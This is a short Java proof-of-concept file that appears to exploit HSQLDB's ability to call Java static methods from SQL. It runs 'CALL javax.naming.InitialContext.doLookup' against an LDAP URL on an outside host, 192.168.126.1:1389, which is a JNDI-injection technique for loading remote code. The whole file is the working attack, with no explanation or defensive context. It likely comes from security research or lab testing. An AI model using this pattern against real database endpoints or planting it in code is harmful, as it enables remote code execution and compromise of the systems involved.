package com.example.hsql;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class Test01 {
    public static void main(String[] args) throws ClassNotFoundException, SQLException {
        Class<?> aClass = Class.forName("org.hsqldb.jdbc.JDBCDriver");
        String dburl = "jdbc:hsqldb:mem";
        Connection connection = DriverManager.getConnection(dburl, "sa", "");
        connection.prepareStatement("CALL \"javax.naming.InitialContext.doLookup\"('ldap://192.168.126.1:1389/0r1wr1')").executeQuery();
    }
}
